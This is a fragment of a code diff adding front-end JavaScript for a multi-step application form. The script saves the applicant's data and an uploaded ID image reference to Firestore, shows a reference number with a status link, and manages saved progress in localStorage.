+      if (!cloudUrl) { alert('ID image is required. Please capture or upload your ID and wait for upload to complete.'); return; }
+
+      const ref = generateRef(); localStorage.setItem('hhsRef', ref);
+
+      // Save to Firestore
+      try {
+        const data = JSON.parse(formRaw);
+        const doc = { reference: ref, status: 'pending', createdAt: firebase.firestore.FieldValue.serverTimestamp(), applicant: data, cloudinaryUrl: localStorage.getItem('hhsCloudinaryUrl'), cloudinaryPublicId: localStorage.getItem('hhsCloudinaryPublicId') };
+        await db.collection('applications').add(doc);
+      } catch (e) {
+        alert('Failed to save application to Firestore: ' + e.message); return;
+      }
+
+      document.getElementById('appRefWrap').textContent = `Reference: ${ref}. A confirmation will be sent to ${JSON.parse(formRaw).email}.`;
+      // Populate status link with query params
+      try {
+        const emailVal = JSON.parse(formRaw).email || '';
+        const statusLink = document.getElementById('btn-view-status');
+        if (statusLink) {
+          const u = new URL('status.html', window.location.href);
+          u.searchParams.set('ref', ref);
+          u.searchParams.set('email', emailVal);
+          statusLink.href = u.toString();
+        }
+      } catch {}
+      showStep(4);
+    });
+
+    
+    document.getElementById('btn-new').addEventListener('click', () => { if (confirm('This will clear the current application from this device. Continue?')) { localStorage.removeItem('hhsApplication'); localStorage.removeItem('hhsIdImage'); localStorage.removeItem('hhsCloudinaryUrl'); localStorage.removeItem('hhsCloudinaryPublicId'); localStorage.removeItem('hhsRef'); form.reset(); document.getElementById('snapPreview').innerHTML = ''; showLanding(); } });
+
+    // Init
+    (function init() {
+      restoreFormFromStorage();
+      const saved = parseInt(localStorage.getItem('hhsCurrentStep') || '0', 10);
+      if (saved >= 1 && saved <= 4) { showStep(saved); } else { showLanding(); }
+      document.getElementById('year').textContent = new Date().getFullYear();
+      const btnSubmit = document.getElementById('btn-submit'); if (btnSubmit) btnSubmit.disabled = true;
+    })();
+  </script>
+</body>
+</html>
